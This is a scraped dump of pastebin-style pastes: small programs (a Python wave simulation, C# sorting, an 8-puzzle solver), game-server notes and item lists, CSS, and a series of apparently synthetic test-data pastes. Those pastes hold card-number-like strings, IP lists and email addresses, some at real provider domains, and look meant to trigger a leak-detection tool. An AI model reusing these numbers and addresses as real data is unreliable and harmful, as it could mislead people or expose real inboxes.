        for particle in particles:

            x = particle.xcor()+width/2

            if wave_type == ""progressive"": y = ""A*math.sin( ((2*math.pi)/T)*t - ((2*math.pi)/lam)*x)""
            elif wave_type == ""standing"": y = ""A*math.sin(((2*math.pi)/lam)*x)*math.cos(((2*math.pi)/T)*t)""

            if longitudinal:
                particle.setx(og_coords[particles.index(particle)][0] + eval(y))
            else:
                particle.sety(eval(y))

        particle_tracer.setpos(particles[chosen_one].xcor(), particles[chosen_one].ycor() - 20)

        win.update()

    win.listen()
    win.onkeypress(win.bye, ""Escape"")

    while True:
        make_wave(wave_type, A, T, lam)

if __name__ == ""__main__"":
    wave_function(boundary_size=500, longitudinal=True, particle_amount=500, wave_type=""standing"", A=30, T=4, lam=100)"
TLf1iBnt,Класиране на приема,Maina55,C#,Tuesday 16th of January 2024 04:11:42 AM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        int[] nums = Console.ReadLine().Split().Select(int.Parse).ToArray();
        //BubbleSort(nums);
        //SelectionSort(nums);
        InsertionSort(nums);
        Console.WriteLine(String.Join("" "", nums));
    }


    public static void BubbleSort(int[] nums)
    {
        int n = nums.Length;

        for (int i = 0; i < n; i++)
        {
            for (int j = 0; j < n - 1; j++)
            {
                if (nums[j] < nums[j + 1])
                {
                    int tempnum = nums[j];
                    nums[j] = nums[j + 1];
                    nums[j + 1] = tempnum;
                }
            }
        }

    }


    public static void SelectionSort(int[] nums)
    {


        int n = nums.Length;
        for (int i = 0; i < n - 1; i++)
        {
            int smallestnum = i;
            for (int j = i + 1; j < n; j++)
            {
                if (nums[j] > nums[smallestnum])
                {
                    smallestnum = j;
                }
            }

            int curnum = nums[smallestnum];
            nums[smallestnum] = nums[i];
            nums[i] = curnum;
        }
    }


    public static void InsertionSort(int[] nums)
    {
        int n = nums.Length;
        for (int i = 1; i < n; i++)
        {
            int key = nums[i];
            int j = i - 1;

            while (j >= 0 && nums[j] < key)
            {
                nums[j + 1] = nums[j];
                j = j - 1;
            }

            nums[j + 1] = key;
        }
    }
   
}

"
sA1GZKVh,Untitled,poxipox,Lua,Tuesday 16th of January 2024 04:06:38 AM CDT,"	https://i.imgur.com/oZ94Nya.png OLD << ustawiania

system jest kompletnie zmieniony (silnikowo wiec tam chuj, ale chodzi o to ze teraz mozesz zupgradowac wszystko (procz setow typu ace set co musisz ubierac w calosci) 

- atack na bronie : mozesz ladowac tylko w 3 sloty 1/2/3 (sztywno do broni) i 3 inne jak nizej (cryt/fury lucky/atack speed/ - wiadomo cza ustawic ograniczenie zeby bronie nie dawaly %hp tylko to zostawic juz na eq) 

tak to wyglada: https://i.imgur.com/bM39rug.png (na ss te same wyglady upgradeow na testey bylo)

upgrady sie stakuja - np masz w przedmiocie 6x  Max Health i ten przedmiot ma juz w sobie Max Health to dodaje, tak samo z bronią np % chance +DMG

ogolnie sloty mozesz czyscic (jak widzisz na ss jest x) - z tym ze bron jak czysicc attack to czysci slot 1/2/3 (gdzie mozesz dac tylko attack upg) 


* POTARY: bedzie specialny UPG gem ktory daje 1 LOSOWy atrubyt (takich mozesz naladowac 6 na itemw ogolnie w item kazdy)
- z tym ze tu mozesz wyczyscic ostatni dodany slot max 10 sec od dodania (nie ma potem opcji konfiguracji) 


[ATTR_ITEM_PERC_HP] = {text = '% max HP', refresh = 1},
	[ATTR_ITEM_PERC_KI] = {text = '% max Ki', refresh = 1},
	[ATTR_ITEM_MAX_HP] = {text = 'Max Health', refresh = 1},
	[ATTR_ITEM_MAX_KI] = {text = 'Max Ki', refresh = 1},
	[ATTR_ITEM_GAINS_KI] = {text = 'Ki Regen', refresh = 3},
	[ATTR_ITEM_GAINS_HP] = {text = 'HP Regen', refresh = 3},
	[ATTR_ITEM_GAINS_PERC_KI] = {text = '% Ki Regen', refresh = 3},
	[ATTR_ITEM_GAINS_PERC_HP] = {text = '% HP Regen', refresh = 3},
	-- [8] = {ATTR_ITEM_unsles, 'ATTR_ITEM_unsles'},

	[ATTR_ITEM_SOUL] = {text = 'Max power', refresh = 1},
	[ATTR_ITEM_CRIT] = {text = 'Critical'},
	[ATTR_ITEM_CRIT_SPELL] = {text = 'Critical Spell'},

	[ATTR_ITEM_ATTACK] = {text = 'Attack'},
	-- [13] = {ATTR_ITEM_unsles, 'ATTR_ITEM_unsles'},
	[ATTR_ITEM_ARMOR] = {text = 'Mele Protect'},

	[ATTR_ITEM_F_LUCKY] = {text = 'Fury Lucky'},
	[ATTR_ITEM_A_SPEED] = {text = 'Attack Speed'},
	[ATTR_ITEM_BARRIER] = {text = 'Ki Barrier', refresh = 1},

	[ATTR_ITEM_DMG_PER_CHANCE] = {text = '% chance to weapon DMG'}, -- te 2 w calosci jedeny upgrade np 100%: 5% chance to +5% dmg
	[ATTR_ITEM_DMG_PER] = {text = '% weapon DMG'},

	[ATTR_ITEM_PROTECT_ALL] = {text = 'Protect ALL', refresh = 1},
	[ATTR_ITEM_PROTECT_PVP] = {text = 'Protect PvP', refresh = 1},
	[ATTR_ITEM_PROTECT_PVM] = {text = 'Protect PvM', refresh = 1},

	[ATTR_ITEM_DMG_ALL] = {text = 'DMG ALL', refresh = 1},
	[ATTR_ITEM_DMG_PVP] = {text = 'DMG PvP', refresh = 1},
	[ATTR_ITEM_DMG_PVM] = {text = 'DMG PvM', refresh = 1},
	[ATTR_ITEM_DODGE_PVM] = {text = 'Dodge vM', refresh = 1},"
YaA7FZQG,Untitled,poxipox,Lua,Tuesday 16th of January 2024 04:04:46 AM CDT,"1, 'PACC 31 Day (Scroll)', 'PACC For 31 Day Scroll', 10, 
4, 'Pacc 3 Day', 'Pacc 3 Day to Your account!', 2, 
2, 'Pacc 21 Day', 'Pacc 21 Day to Your account!', 7, 
3, 'Pacc 7 Day', 'Pacc 7 Day to Your account!', 4, 
5, '200 Senzu', '200 Senzu in Bp', 1, 
6, '200 Golds', '200 Golds (money) in Bp', 1, 
7, 'Box digital card of GOD', 'This box add 1-3 Special digital card (RANDOM!), it allows to change the outfit of God Transform.', 3
8, 'God Essence BOX', 'God Essence BOX <br> - Random:  5-20x God Essence', 3, 
9, 'Ultra Essence box', 'Ultra Essence BOX <br>- Random: 5-20x Ultra Essence ', 4,
10, 'Stamina recovery', 'Add +12h stamina! (max use 3x on 24h!)', 7, 
11, 'Remove 7 Days ban', 'Remove 7 days bans from players.<br>-warning.', 20
12, 'Account AutoLoot', 'Upgrade FREE AutoLoot<br>+)', 5,
13, 'Account AutoLoot (Item)', '', 5
14, 'Skip mission +51', 'Jumps to the 51st mission (!mission)\r\n- Receive items and exp from these missions', 20
15, '[Bonus] ReFill', 'Item which can be re-charged (renew) with Bonus Ki/HP/Power Recovery (1 use and remove)', 3, 
16, 'Starter Box', 'Pack Item for start:\r\n+ 50x Gold\r\n+ 50x Senzu\r\n+ 1x Starter backpack (+100/s HP/KI + Light) + 1x Starter Band200 HP/KI(3h work) \r\n+ 1x BOL\r\n+ 1x Distance Weapon (ki blast etc) \r\n+ 1x Gift?\r\n', 10, 
17, 'Victory Premium', '+ duration 30 days )\r\n+ 40% reduced exh on !mission/!sag/!ssag\r\n+ 5% Master Exp\r\n+ House Train - item to unique (only for the duration of VP)\r\n+ 15/5 slot to account/free autoloot\r\n+ 2 min UI time work', 20
18, '[RANDOM] Profession Change Papers', 'This item add 3x (RANDOM) Papers of [profession/Universal] to alter your Profesion | You must have 10x the same for a particular profession.', 50
19, '10x Paper of [Universal]', 'Special Papers, with these 10x pieces you can change professions to any one you like!', 300"
PegxRTxM,JKIT || JKit Post Block - Full Width Thumbnail,fauzanjeg,CSS,Tuesday 16th of January 2024 04:04:05 AM CDT,"/**	JKit Post Block - Full Width Thumbnail */
.elementor-element-b4decbf .jeg-elementor-kit.jkit-postblock .jkit-post .jkit-thumb .thumbnail-container {
	height: unset;
}

.elementor-element-b4decbf .jeg-elementor-kit.jkit-postblock .jkit-post .jkit-thumb .thumbnail-container img {
	width: 100%;
	height: 100%;
	position: relative;
	top: unset;
	left: unset;
	transform: unset;
}"
tV0uVFNZ,Assignment 2,Alphaviper,Python,Tuesday 16th of January 2024 03:41:49 AM CDT,"import heapq

class PuzzleNode:
    def __init__(self, state, parent=None, move=None, cost=0):
        self.state = state
        self.parent = parent
        self.move = move
        self.cost = cost
        self.heuristic = self.calculate_heuristic()

    def calculate_heuristic(self):
        heuristic = 0
        for i in range(3):
            for j in range(3):
                if self.state[i][j] != 0:
                    goal_row, goal_col = divmod(self.state[i][j] - 1, 3)
                    heuristic += abs(i - goal_row) + abs(j - goal_col)
        return heuristic


    def __lt__(self, other):
        return (self.cost + self.heuristic) < (other.cost + other.heuristic)

def solve_8_puzzle(initial_state):
    goal_state = [[1, 2, 3], [4, 5, 6], [7, 8, 0]]
    initial_node = PuzzleNode(initial_state)
    priority_queue = [initial_node]

    while priority_queue:
        current_node = heapq.heappop(priority_queue)

        if current_node.state == goal_state:
            # Goal state reached, reconstruct the path
            path = []
            while current_node.parent:
                path.append((current_node.move, current_node.state))
                current_node = current_node.parent
            path.reverse()
            return path

        # Generate and enqueue successor nodes
        successors = generate_successors(current_node)
        for successor, move in successors:
            heapq.heappush(priority_queue, successor)

    return None  # No solution found

def generate_successors(node):
    successors = []
    zero_row, zero_col = find_zero_position(node.state)

    # Define possible moves: 'U', 'D', 'L', 'R' for up, down, left, right
    moves = [(-1, 0, 'U'), (1, 0, 'D'), (0, -1, 'L'), (0, 1, 'R')]

    for dr, dc, move in moves:
        new_row, new_col = zero_row + dr, zero_col + dc

        if 0 <= new_row < 3 and 0 <= new_col < 3:
            new_state = [row.copy() for row in node.state]
            new_state[zero_row][zero_col], new_state[new_row][new_col] = new_state[new_row][new_col], 0
            successors.append((PuzzleNode(new_state, node, move, node.cost + 1), move))

    return successors

def find_zero_position(state):
    for i in range(3):
        for j in range(3):
            if state[i][j] == 0:
                return i, j

# Example usage:
initial_state = [[1, 2, 3], [0, 4, 6], [7, 5, 8]]
solution_path = solve_8_puzzle(initial_state)
print(solution_path)
"
QfuQ97jU,Advanced AND - Donald AND Duck AND Hello,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:25:03 AM CDT,"Pasted at: 16/01/2024 09:25
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND
hello, donald was a duck

5502491997132108

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
8spjahLy,Financial What's Inside - Email/IP/Bank,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:25:01 AM CDT,"Pasted at: 16/01/2024 09:25
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3
What's Inside Paste 

5378496492418234
5571598708435236
5587663820997281
5502491997132108
5516931903918995
5322909948799236
5443317136071703
5409137465238695
5497550044220575
5559606180091553

aaribaud@att.net
aaribaud@comcast.net
aaribaud@att.com
aaribaud@att.co.uk
aaribaud@yahoo.com

246.107.72.199
221.187.199.189
3.109.3.44
109.112.85.139
250.83.213.179
169.141.201.234
50.180.50.59
20.181.54.231
64.235.191.167
48.103.36.43"
Fwm1DDyb,Financial with SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:24:59 AM CDT,"Pasted at: 16/01/2024 09:24
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

5148-2121-6312-7114   - DASHES
5148212163127114
5107-4578-0576-9075   - DASHES
5107457805769075
3488-1760-1454-729   - DASHES
348817601454729

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
XQfjiZ98,Domains with SPECIAL CHARS,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:24:58 AM CDT,"Pasted at: 16/01/2024 09:24
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

www.qatesting.com
blog.qatesting.com
www.qatesting.com/index.html
www.qatesting.com/home
www.qatestingblog.com
www.qatestingtutorials.com
shop.qatesting.co.uk
admin.qatesting.io 
qatesting
qatesting.co.uk
qatesting.cn
qatesting.io
findmetesting.com
www.qatesting-blog.com
www.qatesting-blog23.com
www.qatesting
www.qatesting.co.uk
www.qatesting.cn
www.qatesting.io
www.findmetesting.com
www.wobsut.gov

The difference is that QA is process oriented and QC is product oriented.

Testing, therefore is product oriented and thus is in the QC domain. Testing for quality isn't assuring quality, it's controlling it.



Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
DrGVY7KL,ALL Keywords with Excluded Words,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:24:56 AM CDT,"Pasted at: 16/01/2024 09:24
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND 

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, 
or more recently Ex Machina, and even the Avengers. The “furious deity A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, 
it surpasses our abilities in every way, and it destroys us for one of any number of reasons.Maybe it perceives us as a threat. Maybe we’re just in its way, 
and it hardly perceives us at all — mankind, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. 
I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than 
it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with 
no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly 
unknowable coming from?"
FNU8gEZ7,All Keywords with ANY Additional Words,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:24:55 AM CDT,"Pasted at: 16/01/2024 09:24
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND KEYWAUTO

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, or more recently Ex Machina, and even the Avengers. The “angry god A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, it surpasses our abilities in every way, and it destroys us for one of any number of reasons.
Maybe it perceives us as a threat. Maybe we’re just in its way, and it hardly perceives us at all — humanity, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly unknowable coming from?

6589745854123698

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
HS6njXHJ,IP with SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:24:51 AM CDT,"Pasted at: 16/01/2024 09:24
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

123.123.123.149
123.123.123.7
123.123.123.186
123.123.123.47
123.123.123.187
123.123.123.47
123.123.123.130
123.123.123.62
123.123.123.87
123.123.123.1
123.123.123.61
123.123.123.1
123.123.123.65
123.123.123.65
123.123.123.189
123.123.123.193
123.123.123.78
123.123.123.142
123.123.123.107
123.123.123.126
123.123.123.13
123.123.123.171
123.123.123.45
123.123.123.61
123.123.123.93
123.123.123.2
123.123.123.71
123.123.123.41
123.123.123.184
123.123.123.74
123.123.123.106
123.123.123.171
123.123.123.188
123.123.123.177
123.123.123.185
123.123.123.9
123.123.123.184
123.123.123.100
123.123.123.31
123.123.123.164
123.123.123.184
123.123.123.12
123.123.123.153
123.123.123.72
123.123.123.44
123.123.123.119
123.123.123.119
123.123.123.163
123.123.123.38
123.123.123.67
123.123.123.59
123.123.123.10
123.123.123.50
123.123.123.121
123.123.123.145
123.123.123.159
123.123.123.64
123.123.123.6
123.123.123.39
123.123.123.198
123.123.123.17
123.123.123.65
123.123.123.149
123.123.123.84
123.123.123.8
123.123.123.145
123.123.123.65
123.123.123.94
123.123.123.79
123.123.123.177
123.123.123.67
123.123.123.78
123.123.123.80
123.123.123.79
123.123.123.50
123.123.123.87
123.123.123.15
123.123.123.80
123.123.123.145
123.123.123.75
123.123.123.4
123.123.123.59
123.123.123.59
123.123.123.190
123.123.123.64
123.123.123.63
123.123.123.102
123.123.123.114
123.123.123.146
123.123.123.53
123.123.123.124
123.123.123.30
123.123.123.57
123.123.123.64
123.123.123.69
123.123.123.33
123.123.123.12
123.123.123.73
123.123.123.36
123.123.123.153
100.123.123.50
100.123.123.39
100.123.123.156
100.123.123.56
100.123.123.175
100.123.123.121
100.123.123.114
100.123.123.118
100.123.123.13
100.123.123.174
100.123.123.84
100.123.123.161
100.123.123.63
100.123.123.51
100.123.123.66
100.123.123.190
100.123.123.101
100.123.123.72
100.123.123.24
100.123.123.151
100.123.123.143
100.123.123.146
100.123.123.117
100.123.123.21
100.123.123.10
100.123.123.98
100.123.123.114
100.123.123.6
100.123.123.101
100.123.123.14
100.123.123.147
100.123.123.159
100.123.123.157
100.123.123.6
100.123.123.175
100.123.123.35
100.123.123.136
100.123.123.2
100.123.123.139
100.123.123.11
100.123.123.179
100.123.123.16
100.123.123.40
100.123.123.20
100.123.123.20
100.123.123.150
100.123.123.77
100.123.123.48
100.123.123.22
100.123.123.24
100.123.123.9
100.123.123.187
100.123.123.131
100.123.123.148
100.123.123.152
100.123.123.96
100.123.123.199
100.123.123.15
100.123.123.4
100.123.123.112
100.123.123.62
100.123.123.186
100.123.123.36
100.123.123.136
100.123.123.83
100.123.123.38
100.123.123.120
100.123.123.147
100.123.123.15
100.123.123.134
100.123.123.19
100.123.123.196
100.123.123.115
100.123.123.126
100.123.123.39
100.123.123.193
100.123.123.117
100.123.123.115
100.123.123.115
100.123.123.33
100.123.123.121
100.123.123.72
100.123.123.189
100.123.123.76
100.123.123.78
100.123.123.61
100.123.123.112
100.123.123.176
100.123.123.82
100.123.123.183
100.123.123.168
100.123.123.24
100.123.123.134
100.123.123.145
100.123.123.195
100.123.123.189
100.123.123.157
100.123.123.114
100.123.123.34
100.123.123.166

These are a list of generated IPs for test purPoses. They seRVe no purpose only to act as test data for testing activities.
You might findMEtesting 123.123.123.123 or findmetesting 100.123.123.76. These are my favourite ip addresses 123.123.123.23 100.123.123.23.
These are some random words networking, ipaddresses, studpidIPs


Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
BAfdT40f,Hashed Email With Exclude,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:24:50 AM CDT,"Pasted at: 16/01/2024 09:24
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skexclude"
Dg49VHMA,Hashed Email - Full,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:24:48 AM CDT,"Pasted at: 16/01/2024 09:24
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skinclude"
QJvgD0BF,Email with Keyword SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:24:47 AM CDT,"Pasted at: 16/01/2024 09:24
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3 for TESTING PURPOSE ONLY

DATA_ID_TESTDATATOFIND NOEXCLUDES

Cooper.Kleine@findmetesting.co.uk 
Mariquilla.Evenden@findmetesting.co.uk 
Noll.Ingolotti@findmetesting.co.uk  
Grove.Feldbaum@findmetesting.co.uk
Mack.Osment@findmetesting.co.uk 
Trisha.Zanicchelli@findmetesting.co.uk
Jack.Gorriessen@findmetesting.co.uk 
Nefen.Malec@findme-testing.co.uk 
Birdie-Gemmill@findmetesting.co.uk
Rosabella.Nias@findmetesting.co.uk
Ellerey.Fanti@findmetesting.cn
Antonina.Carsey@findmetesting.cn
Valry.Shead@findmetesting.cn 
Conrade.Ferrarone@findmetesting.cn
Neysa.Fazakerley@findmetesting.cn
Cristobal.Primak@findmetesting.cn
Wakefield.Kent@findmetesting.cn
findme.Cheales@findmetesting.cn
Nert.Roddamr@findmetesting.cn 
Richy.Raft@findmetesting.cn
Berget.Kermannes@findmetesting.ie 
Shelden.Tregea@findmetesting.ie 
Allsun.Badrick@findmetesting.ie 
Hortense.Ivkovic@findmetesting.ie
Carolin.Potte@findmetesting.ie
Benjie.Trumble@findmetesting.ie
Andrew.Hadgkiss@findmetesting.ie
Trula.Kuna@findmetesting.ie
Tommie.Maytum@findmetesting.ie
Langsdon.Pakes@findmetesting.ie
Porty.Tooth@findmetesting.au
Rozella.Siggefindmetesting.au
Nolie.Tumultyfindmetesting.au
Dud.Caustonfindmetesting.au
Alvinia.Brameldfindmetesting.au
Meridel.Lymbournefindmetesting.au
Elvis.Maleckfindmetesting.au
Brett.Oughtonfindmetesting.au
Rickard.Clemfindmetesting.au
Prue.Firemanfindmetesting.au
Uriel.Rozenbaum@findmetesting25.com
Cindie.Greeson@findmetesting25.com
Laurette.Puckham@findmetesting25.com
Eldredge.Ricket@findmetesting25.com
Alanah.Rapper@findmetesting25.com
Ash.Le.Prevost@findmetesting25.com
Galvin.Purchon@findmetesting25.com
Lauryn.Ilson@findmetesting25.com
findme.Graffin@findmetesting25.com
Edithe.Trehearne@findmetesting25.com
Den.Cancutt@findmetesting10.com
Wernher.Spatoni@findmetesting10.com
Malchy.Ion@findmetesting10.com
Leona.Whitby@findmetesting10.com
Alphonse.Goodlake@findmetesting10.com
Gran.Standen@findmetesting10.com
Barnie.Gilffilland@findmetesting10.com
Kaylyn.Ditchfield@findmetesting10.com
Dorotea.Kohlerman@findmetesting10.com
Gillan.Lampel@findmetesting10.com
Patrica.Mannakee@findustesting.com
Pippo.Sewart@findustesting.com
Lanae.Cousin@findustesting.com
Porter.Glaysher@findustesting.com
Herschel.Yaakov@findustesting.com
findme.Parsand@findustesting.com
Lucho.Cosh@findustesting.com
Cullie.Powlesland@findustesting.com
Edy.Burkart@findustesting.com
Christophorus.Ackeroyd@findustesting.com
Arvy.Rowson@findUStesting.com
Arlan.Ivanilov@findustesting.com
Tawnya.Waslin@findustesting.com
Inigo.Gyrgorcewicx@findustesting.com
Sharity.Stoodley@findustesting.com
Ginger.Dresse@findustesting.com
Deck.Jouannot@findustesting.com
Deny.Soanes@findustesting.com
james@findmetesting.com

Wenona.Moverley@findqatesting.com
Jerry.Poynter@findqatesting.com
Drugi.Neeson@findqatesting.com
Winny.Binfield@findqatesting.com
Darill.Greenshiels@findqatesting.com
Ethelin.Pinchen@findqatesting.com
Tanney.Ballendine@findqatesting.com
Ariadne.Wincott@findqatesting.com
Winnie.Domm@findqatesting.com
Rogerio.Cudbird@findqatesting.com
Yu@findmetesting.com

RIGHT OF @
findme@findme.testing.com
wildcard@findme*testing.com
dash@findme-testing.com
slash@findme/testing.com
questionmark@findme?testing.com

ACCENTS
Pål@findmetesting.com
Magdalène@findmetesting.com
Anaël@findmetesting.com
Lén@findmetesting.com
Loïs@findmetesting.com
Thérèsa@findmetesting.com
Valérie@findmetesting.com
Görel@findmetesting.com
Mélia@findmetesting.com
Joséphine@findmetesting.com
Loïc@findmetesting.com
findme@findmetesting.com
Méghane@findmetesting.com
Nuó@findmetesting.com
Lén@findmetesting.com
Eliès@findmetesting.com
André@findmetesting.com
Mahélie@findmetesting.com
Méthode@findmetesting.com
Rachèle@findmetesting.com
Mélina@findmetesting.com
Gaëlle@findmetesting.com
Céline@findmetesting.com
Bérangère@findmetesting.com
Françoise@findmetesting.com
Séverine@findmetesting.com
Måns@findmetesting.com
Adèle@findmetesting.com
Aimée@findmetesting.com
Mélia@findmetesting.com
Gösta@findmetesting.com
Laurène@findmetesting.com
Gisèle@findmetesting.com
Mélinda@findmetesting.com
Bécassine@findmetesting.com
Ruì@findmetesting.com
Zoé@findmetesting.com
Maëline@findmetesting.com
Aimée@findmetesting.com
Andréanne@findmetesting.com
Adélaïde@findmetesting.com
Laurène@findmetesting.com
Anaé@findmetesting.com
Noëlla@findmetesting.com
Anaël@findmetesting.com
Maëlyss@findmetesting.com
Lucrèce@findmetesting.com
Lén@findmetesting.com
Marie-thérèse@findmetesting.com
Maéna@findmetesting.com
Hélène@findmetesting.com
Hélèna@findmetesting.com
Méng@findmetesting.com
Crééz@findmetesting.com
Mélanie@findmetesting.com
Frédérique@findmetesting.com
Médiamass@findmetesting.com
André@findmetesting.com
Cinéma@findmetesting.com
Mégane@findmetesting.com
Amélie@findmetesting.com
Nadège@findmetesting.com
Rébecca@findmetesting.com
Médiamass@findmetesting.com
Céline@findmetesting.com
Maïly@findmetesting.com
Maï@findmetesting.com
Maëlann@findmetesting.com
Noëlla@findmetesting.com
Laurélie@findmetesting.com
Ruì@findmetesting.com
Chloé@findmetesting.com
Gaëlle@findmetesting.com
Vénus@findmetesting.com
Frédérique@findmetesting.com
Amélie@findmetesting.com
Loïs@findmetesting.com
Marlène@findmetesting.com
Stévina@findmetesting.com
Clémentine@findmetesting.com
Mégane@findmetesting.com
Méng@findmetesting.com
André@findmetesting.com
Crééz@findmetesting.com
